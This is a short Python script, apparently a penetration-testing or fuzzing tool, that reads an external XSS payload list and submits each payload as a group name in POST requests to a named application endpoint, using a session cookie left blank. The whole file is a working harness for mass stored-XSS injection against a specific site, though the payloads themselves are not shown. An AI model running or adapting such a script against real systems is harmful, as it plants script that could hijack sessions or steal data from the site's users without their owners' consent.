import requests

file = "./xss-payload-list.txt"

f = open(file, "rb")

string_list = f.readlines();

url = 'http://dev.socialspendingapp.com/groups.php'

for i in range(0, len(string_list)):
    myjson = {'operation': 'create', 'group_name': str(string_list[i][:-1])}

    # needs a valid cookie in order to create groups
    x = requests.post(url, json=myjson, headers={"Cookie": "session_id=", "Content-Type": "application/json"})

    print(x.text, " | ", i , "/" , len(string_list));

f.close()

